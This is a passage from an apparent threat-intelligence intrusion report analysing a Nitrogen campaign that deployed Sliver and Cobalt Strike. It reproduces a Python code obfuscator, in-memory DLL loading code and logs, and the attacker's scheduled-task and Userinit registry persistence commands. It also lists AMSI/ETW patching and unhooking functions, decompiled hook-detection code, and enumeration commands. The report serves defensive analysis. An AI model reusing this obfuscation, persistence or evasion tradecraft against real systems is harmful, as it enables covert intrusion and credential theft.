used for serialization and deserialization of Python objects. This snippet is relevant to the analysis of obfuscation techniques used in the context of the Sliver campaign.\nTranscription: |\n  def encode(source: str) -> str:\n      selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))\n      marshal_encoded = marshal.dumps(compile(source, \"Py-Fuscate\", \"exec\"))\n      \n      if selected_mode is binascii:\n          return \"import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))\".format(\n              binascii.b2a_base64(marshal_encoded)\n          )\n      \n      return \"import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))\".format(\n          selected_mode.__name__, selected_mode.compress(marshal_encoded)\n      )\n```\n\nThe Sliver execution revealed multiple interesting debugging strings. In the first instance, Windows API functions’ addresses are resolved.\n\n```image\nAlt: Debugging Strings\nDescription: The image displays a console output from a debugging session, showing detailed logs related to the loading and execution of a Dynamic Link Library (DLL). It includes various debug messages indicating memory allocation, section copying, and the resolving of import addresses for functions like 'AddVectoredExceptionHandler' and 'CreateFileA'. This output is pertinent for analyzing the execution of the Sliver DLL as part of the cyber threat intelligence investigation.\nTranscription: |\n  DEBUG: Reserved 105349129 bytes for dll at address: 0x213ad000\n  DEBUG: Section no. .text to address: 0x213ad000\n  DEBUG: Copied section no. .idata to address: 0x213af600\n  DEBUG: Section no. .rdata to address: 0x21415000\n  DEBUG: Section no. .pdata to address: 0x21415700\n  DEBUG: Section no. .xdata to address: 0x21415e00\n  DEBUG: Section no. .edata to address: 0x21416000\n  DEBUG: Section no. .crt to address: 0x21440000\n  DEBUG: Section no. .tls to address: 0x21445000\n  DEBUG: Copied section no. .reloc to address: 0x21446000\n  DEBUG: Checking for base relocations.\n  DEBUG: Building import table.\n  DEBUG: codebase:0x213ad000\n  DEBUG: Found imported address: 0x2144c3000\n  DEBUG: Found imported DLL, KERNEL32.dll. Loading..\n  DEBUG: Found import by name entry AddVectoredExceptionHandler at address 0x2144c329c\n  DEBUG: Resolved import by name entry CloseHandle at address 0x2144c32a4\n  DEBUG: Resolved import CloseHandle at address 0x7ff83abe4e0\n  DEBUG: Resolved import CreateEventA at address 0x2144c32ac\n  DEBUG: Resolved import CreateEventA at address 0x7ff83abe930\n  DEBUG: Found import by name entry CreateFileA at address 0x2144c32b4\n  DEBUG: Resolved import CreateFileA at address 0x7ff83abe450\n  DEBUG: Found import by name entry CreateIoCompletionPort at address 0x2144c32bc\n  DEBUG: Resolved import CreateIoCompletionPort at address 0x7ff83abdb950\n  DEBUG: Found import by name entry CreateThread at address 0x2144c32c4\n  DEBUG: Resolved import CreateThread at address 0x7ff83abdb5a0\n  DEBUG: Found import by name entry CreateWaitableTimerExW at address 0x2144c32cc\n  DEBUG: Resolved import CreateWaitableTimerExW at address 0x7ff83abe490\n```\n\nSubsequently, the Sliver DLL is injected into memory, and the DLL entry point is called.\n\n```image\nAlt: DLL Injection\nDescription: The image displays a log of debugging information related to the execution of a DLL (Dynamic Link Library) within a memory process. It includes detailed entries indicating various sections of the memory, their sizes, and the associated protection flags. The log shows actions such as executing and writing data, along with addresses in physical memory. Notably, it mentions the execution of TLS (Thread Local Storage) callbacks and the call to the DLL entry point with specific parameters, which is critical for understanding the process of DLL injection and execution in a malware context.\nTranscription: |\n  DEBUG: Finalizing sections.\n  DEBUG: Found 11 total sections.\n  DEBUG: Section n. 0\n  DEBUG: size=4795392\n  DEBUG: execute 1\n  DEBUG: read 1\n  DEBUG: write 0\n  DEBUG: Protection flag:32\n  DEBUG: physaddr:0x213ad1000\n  DEBUG: Section n. 1\n  DEBUG: size=307200\n  DEBUG: execute 0\n  DEBUG: read 1\n  DEBUG: write 0\n  DEBUG: Protection flag:4\n  DEBUG: physaddr:0x213f64000\n  DEBUG: Section n. 2\n  DEBUG: size=4881920\n  DEBUG: execute 0\n  DEBUG: read 1\n  DEBUG: write 0\n  DEBUG: Protection flag:2\n  DEBUG: physaddr:0x213faf000\n  DEBUG: Section n. 3\n  DEBUG: size=1536\n  DEBUG: execute 0\n  DEBUG: read 1\n  DEBUG: write 0\n  DEBUG: Protection flag:2\n  DEBUG: physaddr:0x2144457000\n  DEBUG: Section n. 4\n  DEBUG: size=1536\n  DEBUG: execute 0\n  DEBUG: read 1\n  DEBUG: write 0\n  DEBUG: Protection flag:2\n  DEBUG: physaddr:0x214458000\n  DEBUG: Section n. 5\n  DEBUG: Uninitialized data, return\n  DEBUG: Section n. 6\n  DEBUG: Uninitialized data, return\n  DEBUG: Section n. 7\n  DEBUG: Uninitialized data, return\n  DEBUG: Section n. 8\n  DEBUG: Uninitialized data, return\n  DEBUG: Section n. 9\n  DEBUG: Uninitialized data, return\n  DEBUG: Section n. 10\n  DEBUG: Uninitialized data, return\n  DEBUG: Executing TLS.\n  DEBUG: TLS callback executed\n  DEBUG: Checking for entry point.\n  DEBUG: Calling dll entrypoint 0x213ad1350 with DLL_PROCESS_ATTACH\n```\n\nThese debugging strings are the same ones used by Pyramid in the pythonmemorymodule, which is a module used to inject and execute DLLs in memory.\n\n```image\nAlt: Pyramid Debugging Strings\nDescription: The image displays a snippet of Python code that appears to be part of a script used for debugging. It includes functions that resolve imported entries by name and address. Key elements highlighted in red indicate specific debug messages that log found import entries and their addresses. This code is likely related to the analysis of the Sliver payload mentioned in the CTI context, showcasing the technical details involved in the execution and memory operations.\nTranscription: |\n  for j in range(0, len(entry_imports)):\n      funcref = cast(funcrefaddr, PFARPROC)\n      if entry_imports[j].import_by_ordinal == True:\n          if 'decode' in dir(entry_imports[j].ordinal):\n              importordinal = entry_imports[j].ordinal.decode('utf-8')\n          else:\n              importordinal = entry_imports[j].ordinal\n          self.dbg('Found import ordinal entry, %s', cast(importordinal, LPCSTR))\n          funcref.contents = GetProcAddress(hmod, cast(importordinal, LPCSTR))\n          address = funcref.contents\n      else:\n          importname = entry_imports[j].name.decode('utf-8')\n          self.dbg('Found import by name entry %s , at address 0x%X', importname, entry_imports[j].address)\n          address = getprocaddr(nmod, importname.encode())\n          if not memmove(funcrefaddr, address.to_bytes(sizeof(LONG_PTR), 'little'), sizeof(LONG_PTR)):\n              raise WindowsError('memmove failed')\n          self.dbg('Resolved import %s at address 0x%X', importname, address)\n          if not bool(address):\n              raise WindowsError('Could not locate function for thunkref %s', importname)\n      funcrefaddr += sizeof(PFARPROC)\n      j += 1\n      i += 1\n```\n\nBy analyzing the `python.exe` process memory, it was possible to notice the DLL injected in the memory sections previously described in the debugging strings.\n\n```image\nAlt: Memory Analysis\nDescription: The image displays the properties of a process named 'python.exe' with process ID 4400. It shows a snapshot of the 'Memory' tab, detailing various memory regions allocated by the process. Each row lists the base address, type of memory (Private: Commit), size, protection attributes (Read, Write, Execute), and usage details. The highlighted region at the base address 0x213ad000 is notable for having a size of 4,684 kB and is marked as executable and readable (RX). This information is relevant for understanding memory allocation and potential DLL injection activities associated with the Sliver payload.\nTranscription: |\n  python.exe (4400) Properties\n  \n  Base address     Type             Size      Protection  Total WS   Private WS  Sh...   Use\n  0x7ffe0000       Private: Commit  4 kB      R           4 kB       4 kB        4 kB\n  0x7fee0000       Private: Commit  4 kB      R           4 kB       4 kB        4 kB\n  0x213ad000       Private: Commit  4 kB      RW          4 kB       4 kB        4 kB\n  0x213ad1000      Private: Commit  4'684 kB  RX          4'684 kB   4'684 kB    USER_SHARED_DATA\n  0x213f64000      Private: Commit  300 kB    RW          300 kB     300 kB      300 kB\n```\n\nThe Sliver DLL exports multiple functions; however, `StartW` is the one to run the beacon.\n\n```image\nAlt: Sliver DLL Functions\nDescription: The image displays a table listing functions exported by a DLL. The table includes columns for index, name, flag, location, duplicate, and order. The function 'StartW' is highlighted in red, indicating its significance, while other functions like 'DllInstall', 'DllRegisterServer', and 'DllUnregisterServer' are marked with an 'x' under the flag column, suggesting they are not relevant for execution.\nTranscription: |\n  | index | name                | flag (3) | location       | duplicate (0) | order |\n  | ----- | ------------------- | -------- | -------------- | ------------- | ----- |\n  | 1     | DllInstall          | x        | .text:0x48D... | -             | -     |\n  | 2     | DllRegisterServer   | x        | .text:0x48D... | -             | -     |\n  | 3     | DllUnregisterServer | x        | .text:0x48D... | -             | -     |\n  | 4     | StartW              | -        | .text:0x48D... | -             | -     |\n  | 5     | VoidFunc            | -        | .text:0x48D... | -             | -     |\n  | 6     | _cgo_dummy_export   | -        | .reloc:0x9F... | -             | -     |\n```\n\nMultiple strings related to Sliver were found in the process memory.\n\n```image\nAlt: Sliver Strings\nDescription: The image displays a code snippet from a GitHub repository related to the Sliver framework. It features a list of function addresses and corresponding file paths, detailing the implementation of various components within the Sliver project, specifically showing functions related to shell operations and tunnel handling. This information is useful for understanding the structure and functionality of the Sliver framework.\nTranscription: |\n  0x214227373 59 github.com/bishopfox/sliver/implant/sliver/shell/ssh.go\n  0x2142273af 62 github.com/bishopfox/sliver/implant/sliver/rportfwd/portfwd.go\n  0x21422742e 68 github.com/bishopfox/sliver/implant/sliver/rportfwd/tunnel_writer.go\n  0x214227473 65 github.com/bishopfox/sliver/implant/sliver/shell/shell_windows.go\n  0x2142274ef 83 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/statute/addr.go\n  0x214227543 87 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/statute/auth.go\n  0x21422757f 86 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/statute/datagram.go\n  0x214227646 85 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/statute/message.go\n  0x21422769c 86 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/statute/method.go\n  0x2142276f3 81 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/statute/statute.go\n  0x214227774 75 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/bufferpool/pool.go\n  0x21422779c 82 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/credentials.go\n  0x2142277e9 77 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/handle.go\n  0x214227837 77 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/logger.go\n  0x214227885 78 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/ruleset.go\n  0x214227924 77 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/server.go\n  0x2142279c7 81 github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers/data_cache.go\n  0x214227a76 86 github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers/data_handler.go\n  0x214227ab6 84 github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers/portfwd_handler.go\n  0x214227b11 81 github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers/utils.go\n  0x214227b66 84 github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers/shell_handler.go\n  0x214227bb8 77 github.com/things-go/go-socks5@v0.0.3-0.20210722055343-24af464efe43/option.go\n  0x214227c0 63 github.com/bishopfox/sliver/implant/sliver/handlers/handlers.go\n  0x214227c5e 63 github.com/bishopfox/sliver/implant/sliver/handlers/handlers.go\n  0x214227c6e 69 github.com/bishopfox/sliver/implant/sliver/handlers/handlers_windows.go\n  0x214227d2c 71 github.com/bishopfox/sliver/implant/sliver/rpc/handlers-cgo.go\n  0x214227d8 59 github.com/bishopfox/sliver/implant/sliver/rpc/handlers.go\n  0x214227e40 72 github.com/bishopfox/sliver/implant/sliver/rpc/rportfwd-handlers.go\n```\n\n---\n\n## Persistence\n\n### Scheduled Task\n\nDuring the intrusion, the threat actor created multiple scheduled tasks to achieve persistence. This persistence technique was abused on the beachhead host and each host moved to laterally during the first day.\n\n```\nschtasks  /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-REDACTED\" /tr c:\\windows\\adfs\\py\\UpdateEdge.bat /SC ONSTART /F\nschtasks  /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-REDACTED\" /tr C:\\Users\\REDACTED\\AppData\\Local\\Notepad\\upedge.bat /SC ONSTART /F\n```\n\nHowever, some of them had mistakes and therefore were not correctly working. For example, in the following task, the threat actor didn’t specify the `\\` between `C:` and the executable name.\n\n```\nschtasks /create /I 1 /TR C:WindowsTempUpdate.exe /TN UpdateEdge /SC ONIDLE\n```\n\nWhile some tasks used the `ONSTART` option to enable persistence after reboot, some used a time frame to execute every 720 minutes. For example, on a server, the threat actor dropped a BAT file named `UpdateEdge.bat` and subsequently created two scheduled tasks using this option.\n\n```image\nAlt: Scheduled Task Example\nDescription: The image shows a snippet of a batch script titled 'UpdateEdge.bat'. The script begins with the command '@echo off', indicating that commands are not to be displayed when the script runs. It sets three variables: 'g', 'h', and 'n', which define file paths and executables related to a potential malicious operation. The script ends with a call to execute a command based on these variables, specifically '%g%%h%%n%'. This image is relevant to the CTI context as it illustrates the contents of a file used in the persistence mechanism of a cyber threat.\nTranscription: |\n  @echo off\n  set g=c:\\windows\\adfs\\py\\Upda\n  set h=teJson.exe c:\\windows\\a\n  set n=dfs\\py\\wo12.py\n  %%g%%h%%n%%\n```\n\n### Registry Key\n\nTo ensure persistence on the beachhead host and three servers, the threat actor added an entry in the `Winlogon\\Userinit` registry key to ensure the execution of `UpdateEdge.bat` whenever a user logs into the systems.\n\n```\ncmd.exe /C reg add \"HKLM\\software\\microsoft\\windows nt\\currentversion\\winlogon\" /v UserInit /t reg_sz /d \"c:\\windows\\system32\\userinit.exe,c:\\users\\[REDACTED]\\appdata\\local\\notepad\\UpdateEdge.bat\n```\n\n```image\nAlt: Registry Key Example\nDescription: The image displays a screenshot of a registry key viewer, specifically showing the details for the 'Userinit' registry value. It indicates the key's name as 'Userinit', the value type as 'RegSz', and the value itself, which includes paths to 'userinit.exe' and 'UpdateEdge.bat'. This information is relevant to the context of the Nitrogen campaign, highlighting how the threat actor ensures persistence by modifying the registry key.\nTranscription: |\n  Type viewer\n  Slack viewer\n  Binary viewer\n  \n  Value name: Userinit\n  Value type: RegSz\n  Value: c:\\windows\\system32\\userinit.exe,C:\\Users\\...\\AppData\\Local\\Notepad\\upedge.bat\n```\n\n---\n\n## Privilege Escalation\n\nOn the beachhead system, the initial payload `setup.exe` was executed with High integrity level, which means that the binary was run with the access level equivalent to Administrator access.\n\n```image\nAlt: Privilege Escalation Example\nDescription: The image displays a log entry related to a security event. It shows the file path of the executable `setup.exe` located in the `Downloads` folder of a user directory. Additionally, it specifies the integrity level of the process as 'High', indicating that the executable was run with elevated permissions, equivalent to Administrator access.\nTranscription: |\n  winlog.event_data.Image\n  C:\\Users\\[REDACTED]\\Downloads\\Version\\setup.exe\n  \n  winlog.event_data.IntegrityLevel\n  High\n```\n\nAn injected `cmd.exe` process from the beachhead host opened `winlogon.exe` with an access mask of `0x143A`, which, when decoded, revealed the `PROCESS_VM_WRITE` permission. The `cmd.exe` process then executed process injection into `winlogon.exe`.\n\n```image\nAlt: Process Injection Example\nDescription: The image depicts a table containing details related to process execution in a Windows environment. It includes columns for the executable path of the process (`process.executable`), the target image being accessed (`winlog.event_data.TargetImage`), the granted access level to the target process (`winlog.event_data.GrantedAccess`), and the event code associated with the actions taken (`event.code`). The specific entries show `cmd.exe` as the executing process, targeting `winlogon.exe`, with a granted access mask of `0x143a` for the first entry and an event code of 10, while the second entry has a granted access value of '-' and event code 8.\nTranscription: |\n  | process.executable          | winlog.event_data.TargetImage    | winlog.event_data.GrantedAccess | event.code |\n  | --------------------------- | -------------------------------- | ------------------------------- | ---------- |\n  | C:\\Windows\\System32\\cmd.exe | C:\\Windows\\system32\\winlogon.exe | 0x143a                          | 10         |\n  | C:\\Windows\\System32\\cmd.exe | C:\\Windows\\system32\\winlogon.exe | -                               | 8          |\n```\n\nAll scheduled tasks created by the threat actor were set up to run in SYSTEM context, ensuring that access would stay elevated on hosts.\n\n```image\nAlt: Scheduled Task SYSTEM Context\nDescription: The image displays a command-line output showing multiple instances of the `schtasks` command. Each instance is creating a scheduled task with SYSTEM privileges, indicating that the tasks will run with elevated access. The tasks seem to be set to execute a script located in specific user directories, highlighting the persistence mechanism used by the threat actor to maintain access on the compromised system.\nTranscription: |\n  process.command_line\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\users\\█████\\appdata\\local\\notepad\\UpdateEdge.bat /SC ONSTART /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\users\\█████\\appdata\\local\\notepad\\UpdateEdge.bat /sc MINUTE /mo 720 /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\windows\\adfs\\py\\UpdateEdge.bat /SC ONSTART /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\windows\\adfs\\py\\UpdateEdge.bat /sc MINUTE /mo 720 /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\users\\█████\\AppData\\Local\\Notepad\\upedge.bat /SC ONSTART /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\users\\█████\\AppData\\Local\\Notepad\\upedge.bat /sc MINUTE /mo 720 /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\windows\\adfs\\py\\UpdateEdge.bat /SC ONSTART /F\n  schtasks /create /ru SYSTEM /tn \"OneDrive Security Task-S-1-5-21-██████████\" /tr c:\\windows\\adfs\\py\\UpdateEdge.bat /sc MINUTE /mo 720 /F\n```\n\n---\n\n## Defense Evasion\n\n### Nitrogen\n\nBy analyzing the modified Python DLL (`python311.dll`), we noticed multiple defense evasion functionalities implemented, such as:\n\n- Removing hooks from Windows API functions.\n- Obfuscating the payload in memory (i.e., Sleep Obfuscation).\n- Bypassing AMSI, WLDP, and ETW.\n\nBased on code overlaps, those techniques could have been copied from the following GitHub repositories:\n\n- Antimalware-Research/Generic/Userland Hooking/AntiHook\n- KrakenMask\n- Donut Loader Bypass\n- Patching WLDP\n\n```image\nAlt: Defense Evasion Example\nDescription: The image displays a code listing from a disassembler or a similar tool, showcasing various functions related to defense evasion techniques in a Python DLL. Key functions such as `DisableAMSI`, `PatchWLDP`, and `PatchETW` are visible, indicating capabilities to disable security features in Windows. Each entry includes a function name, its address in memory, and possibly other metadata, which highlights the technical details relevant to the analysis of malware behavior.\nTranscription: |\n  fixup                                                      .text  00000030F2745FE  0000000E  0000010   R\n  SpoofStub                                                  .text  00000030F2754D0  00000028  00000028  R\n  DisableAMSI(void)                                          .text  00000030F275230  00000029  000000A8  R\n  PatchWLPD()                                                .text  00000030F274F40  00000026  000000C8  R\n  PatchETW()                                                 .text  00000030F274840  00000078  00000138  R\n  AmsiScanBufferStubEnd(void)                                .text  00000030F274830  00000001  00000000  R\n  AmsiScanBufferStub(HAMSCONTEXT__ *,void *,ulong,wchar_t *) .text  00000030F274820  0000001E  00000030  R\n  WldpQueryDynamicCodeTrustStubEnd(void)                     .text  00000030F274810  00000003  00000000  R\n  WldpQueryDynamicCodeTrustStub(void *,void *)               .text  00000030F274800  0000003E  0000020B  R\n  AntiHooks(void)                                            .text  00000030F274310  0000004F  000002D8  R\n  UnhookModule(HINSTANCE__ *)                                .text  00000030F273FD0  00000033  00000188  R\n  ReplaceExecSection(HINSTANCE__ ,void *)                    .text  00000030F273E90  00000034  00000068  R\n  CheckModuleForHooks(HINSTANCE__ *,_HOOK_FUNC_INFO **)      .text  00000030F273630  00000085  00000048  R\n  CompareFilePaths(char const*,char const*)                  .text  00000030F273510  00000016  0000028   R\n  IsHooked(void *,ulong long)                                .text  00000030F273300  00000022  000000C8  R\n  GetModuleName(HINSTANCE__ *,char *,ulong)                  .text  00000030F2731A0  00000054  00000008  R\n  GetModules(HINSTANCE__ *,ulong,ulong *)                    .text  00000030F2730D0  00000009  0000009   R\n  FreeHookFuncInfo(_HOOK_FUNC_INFO **)                       .text  00000030F272F10  00000011  00000058  R\n  NewHookFuncInfo(void)                                      .text  00000030F272C0   00000017  00000078  R\n  FreeModuleHookInfo(_MODULE_HOOK_INFO *,ulong long)         .text  00000030F272B0   00000006  0000004   R\n  krakenSleep(ulong)                                         .text  00000030F271E00  000000BE  00000298  R\n  TakeSectionInfo(_SECTION_INFO *)                           .text  00000030F271D50  0000000B  0000004   R\n  GenerateKey(uchar *,ulong)                                 .text  00000030F271A2A  00000027  00000048  R\n  Spoofer(void *,void *,void *,void *)                       .text  00000030F2718D0  00000013  00000048  R\n  GetNtDllAddr(void)                                         .text  00000030F2718F0  0000000C  00000048  R\n  HashStringDjb2A(char const*)                               .text  00000030F2717B0  0000000C  00000048  R\n  HashString(void *,uchar *,char const*)                     .text  00000030F2717C0  0000000E  00000048  R\n  HashStringDjb2(char const*)                                .text  00000030F2717D0  0000000A  00000048  R\n  HashStringDjb2B(char const*)                               .text  00000030F2717E0  0000000B  00000048  R\n  HashStringDjb2C(char const*)                               .text  00000030F2717F0  0000000D  00000048  R\n  HashStringDjb2D(char const*)                               .text  00000030F271800  0000000F  00000048  R\n  HashStringDjb2E(char const*)                               .text  00000030F271810  00000011  00000048  R\n  HashStringDjb2F(char const*)                               .text  00000030F271820  00000013  00000048  R\n  HashStringDjb2G(char const*)                               .text  00000030F271830  00000015  00000048  R\n  HashStringDjb2H(char const*)                               .text  00000030F271840  00000017  00000048  R\n```\n\nAn example of code overlap is shown in the following image related to the `IsHooked()` function.\n\n```image\nAlt: Code Overlap Example\nDescription: The image displays a code snippet from a programming environment, showcasing the implementation of a function named `IsHooked`. This function analyzes a memory address to determine if it has been hooked, which is a common technique in malware defense evasion. The code is structured with conditional statements and a switch-case structure to assess various conditions of the function pointer. The layout presents multiple code blocks that likely demonstrate different parts of the function's logic and how it processes the input address, including checks for specific byte values.\nTranscription: |\n  c\n  int64 _usercall IsHooked@<rax>(DWORD_PTR *dwAddressOffset@<rdx>, const LPVOID lpFuncAddress@<rcx>)\n  {\n      LPCBYTE lpAddress; // rax\n      __int64 result;    // rax\n      char v4;          // al\n      char v5;          // al\n      char v6;          // al\n      char v7;          // al\n      char v8;          // al\n      bool v9;          // al\n  \n      LOBYTE(lpAddress) = *(BYTE *)lpFuncAddress;\n      if (*(BYTE *)lpFuncAddress == 0xE9)\n          *dwAddressOffset = 1LL;\n      return 2LL;\n  \n      switch ((BYTE)lpAddress)\n      {\n          case 0x90:\n              v4 = *((BYTE *)lpFuncAddress + 1);\n              if (v4 == (char)0xE9)\n              {\n                  *dwAddressOffset = 2LL;\n                  return 2LL;\n              }\n      }\n  \n      default:\n          if ((*(BYTE *)lpFuncAddress + 5) == 0xFF && (*(BYTE *)lpFuncAddress + 6) == 0x25)\n              goto LABEL_19;\n          v9 = *(BYTE *)lpAddress == 0x48;\n          result = 2LL;\n          if (v9 && (*(BYTE *)lpFuncAddress + 1) == 0xFF && *(BYTE *)lpFuncAddress + 2 == 0x25)\n          {\n              *dwAddressOffset = 3LL;\n              return HOOK_UNSUPPORTED;\n          }\n          else if (*(BYTE *)lpFuncAddress[6] == 0x25)\n          {\n              *dwAddressOffset = 7LL;\n              //return HOOK_ABSOLUTE_INDIRECT;\n          }\n          else if (*(BYTE *)lpFuncAddress[1] == 0xFF && *(BYTE *)lpFuncAddress[2] == 0x25)\n          {\n              *dwAddressOffset = 3LL;\n              return HOOK_UNSUPPORTED;\n          }\n  }\n```\n\n### Masquerading\n\nTo conceal malicious activities as normal system events, the threat actor masqueraded both the initial payload and the persistence mechanisms by:\n\n- Renaming `python.exe` to `setup.exe`.\n\n```image\nAlt: Masquerading Example\nDescription: The image displays a detailed output of a process creation event related to the execution of a malicious payload. It includes key information such as the image path (setup.exe), file version (3.11.3), and original filename (python.exe), indicating that a Python executable has been renamed to disguise its true nature. Additional data include the associated process ID, user login ID, parent process details, and various hash values that could be used for further analysis of the threat. This information is crucial for understanding how the threat actor attempted to evade detection by masquerading as a legitimate application.\nTranscription: |\n  Process Create:\n  RuleName: technique_id=T1204, technique_name=User Execution\n  UtcTime: \n  ProcessGuid: {c6f00a71-7c1d-654b-77b1-000000000000}\n  ProcessId: 916\n  Image: C:\\Users\\<User>\\Downloads\\Version\\setup.exe\n  \n  FileVersion: 3.11.3\n  Description: Python\n  Product: Python\n  Company: Python Software Foundation\n  OriginalFileName: python.exe\n  \n  CommandLine: \"C:\\Users\\<User>\\Downloads\\Version\\setup.exe\"\n  CurrentDirectory: C:\\Users\\<User>\\Downloads\\Version\\\n  User: \n  LogonGuid: {c6f00a71-2a6b-641e-5036-4d1000000000}\n  LogonId: 0x143D56\n  TerminalSessionId: 2\n  IntegrityLevel: High\n  Hashes: SHA1=F7D47BFF1169BA49074C4F5542B23C8B9E, MD5=9F12BA143F629152804C179C9B9D1C48, SHA256=243B3D52B8322DC5A9B2FA57684954CD7D4E378E279DAC20A816009B16009, IMPHASH=E1B2E6B6CFF729964A5C2C82CC2CB807\n  ParentProcessGuid: {c6f00a71-2a81-641e-9b10-000000000400}\n  ParentProcessId: 516\n  ParentImage: C:\\Windows\\explorer.exe\n  ParentCommandLine: C:\\Windows\\Explorer.EXE\n```\n\n- Naming the scheduled tasks to mirror OneDrive and Microsoft Edge.\n\n```image\nAlt: Scheduled Task Masquerading\nDescription: The image displays a list of scheduled tasks from a Windows event log, specifically focusing on task names that have been manipulated by a threat actor. The tasks are named to resemble legitimate tasks associated with OneDrive and Microsoft Edge, which is indicative of a tactic used for defense evasion in cyber attacks. The formatting suggests that this is a screenshot of a code or log interface, showing how the malicious actor attempts to mask their activities by using common software names.\nTranscription: |\n  winlog.event_data.TaskName\n  \\UpdateEdge\n  \\OneDrive Security Task-S-1-5-21-\n  \\OneDrive Security Task-S-1-5-21-\n  \\OneDrive Security Task-S-1-5-21-\n  \\OneDrive Security Task-S-1-5-21-\n  \\OneDrive Security Task-S-1-5-21-\n  \\OneDrive Security Task-S-1-5-21-\n```\n\n- Renaming the Python executable used for executing their Python stagers for Sliver and Cobalt Strike.\n\n```image\nAlt: Python Executable Renaming\nDescription: The image displays a table containing details of processes involved in a potential cyber threat activity. It includes columns for 'process.name', 'process.command_line', 'process.parent.name', and 'process.parent.command_line'. The rows indicate the commands used for renaming a Python executable (from 'python.exe' to 'UpdateJson.exe') and the parent processes associated with these actions. This technical data is relevant for understanding the masquerading techniques used by threat actors.\nTranscription: |\n  | process.name | process.command_line                                             | process.parent.name | process.parent.command_line |\n  | ------------ | ---------------------------------------------------------------- | ------------------- | --------------------------- |\n  | cmd.exe      | C:\\Windows\\system32\\cmd.exe /C rename pythonw.exe UpdateJson.exe | winlogon.exe        | winlogon.exe                |\n```\n\n---\n\n## Credential Access\n\nTwo hours after initial access, the threat actor utilized Cobalt Strike’s credential dumping functionalities to access the LSASS process on the beachhead host. This provided them access to a shared local administrator account. Around two hours after that, they landed on a server during lateral movement activity, where the threat actor was seen accessing LSASS. After this, we observed the use of a domain administrator account, indicating this second access likely delivered those credentials.\n\n```image\nAlt: Credential Access Example\nDescription: The image displays a snippet of technical data related to a credential access event during a cyber attack. It includes details such as the executable file path ('C:\\Windows\\system32\\gupdate.exe'), the target image being accessed ('C:\\Windows\\system32\\lsass.exe'), granted access permissions ('0x1ffff'), and various identifiers like TargetProcessGUID, TargetProcessId, as well as user contexts (SourceUser and TargetUser). This information is critical for understanding the sequence of actions taken by the threat actor during the attack.\nTranscription: |\n  executable: C:\\Windows\\system32\\gupdate.exe,\n  TargetImage: C:\\Windows\\system32\\lsass.exe,\n  GrantedAccess: 0x1ffff,\n  TargetProcessGUID: {c6f00a71-d8f5-641c-0c00-000000000400},\n  TargetUser: NT AUTHORITY\\SYSTEM,\n  TargetProcessId: 740,\n  SourceUser: NT AUTHORITY\\SYSTEM,\n  CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|UNKNOWN(000001B918D70D3D)\n```\n\n---\n\n## Discovery\n\n### Sliver\n\nA few minutes after its execution, Sliver launched the following commands to enumerate:\n\n- Local and domain admins.\n- Domain computers.\n- Active Directory trusts.\n- Network adapters.\n\n```\nnet group \"domain admins\" /domain\nipconfig /all\nnltest /domain_trusts\nnet localgroup administrators\nnet group \"Domain Computers\" /domain\n```\n\n### Cobalt Strike\n\nAs with Sliver, Cobalt Strike was utilized to perform hands-on keyboard discovery activities.\n\n```\ncmd.exe /C net group \"Domain controllers\" /DOMAIN\ncmd.exe /C net group \"domain admins\" /DOMAIN\ncmd.exe /C net localgroup Administrators\ncmd.exe /C net group /Domain\ncmd.exe /C net group \"Domain Computers\" /DOMAIN\n```\n\n### PowerView\n\nOn the beachhead host, the threat actor loaded PowerView in memory to perform further discovery activities. This specific action was identified through PowerShell Script Block Logging.\n\n```image\nAlt: PowerView Example\nDescription: The image displays a segment of PowerShell script code, specifically related to PowerView and PSReflect. It includes comments detailing the author, license, and dependencies of the PowerView script. The code includes a function definition for creating an in-memory module, indicating its purpose and usage examples. This technical content is relevant for understanding the tools and methods used by threat actors for discovery activities, as mentioned in the accompanying CTI context.\nTranscription: |\n  Creating Scriptblock text (1 of 29):\n  #requires -version 2\n  #\n  # PowerSploit File: PowerView.ps1\n  # Author: Will Schroeder (@harmj0y)\n  # License: BSD 3-Clause\n  # Required Dependencies: None\n  # Optional Dependencies: None\n  #\n  ######################################################################\n  # PSReflect code for Windows API access\n  # Author: @mattifestation\n  # https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1\n  ######################################################################\n  function New-InMemoryModule\n  {\n  <#\n  .SYNOPSIS\n  Creates an in-memory assembly and module.\n  \n  Author: Matthew Graeber (@mattifestation)\n  License: BSD 3-Clause\n  Required Dependencies: 